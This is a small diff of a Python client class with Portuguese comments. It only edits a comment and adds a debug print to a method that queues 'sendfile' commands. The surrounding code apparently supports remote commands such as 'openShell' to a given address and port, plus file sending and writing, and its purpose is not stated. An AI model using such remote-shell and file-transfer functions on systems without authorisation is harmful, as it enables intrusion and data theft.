@@ -47,7 +47,7 @@ class client:
         self.cvcmd.acquire() #interrupcao 
         #produce item
         self.cmd=cmdList
-        self.cvcmd.notify() #acorda wait
+        self.cvcmd.notify() #acorda wait, fazendo o get pegar o comando
         self.cvcmd.release()
 
     def setFile(self,fname):
@@ -61,7 +61,9 @@ class client:
         self.setCmd(["openShell",addr,port])
         
     def sendFile(self,fname):
+        print("setado: " + str(["sendfile",fname]))
         self.setCmd(["sendfile",fname])
+        
 
     def writefile(self,fname):
         self.setCmd(["writefile",fname])
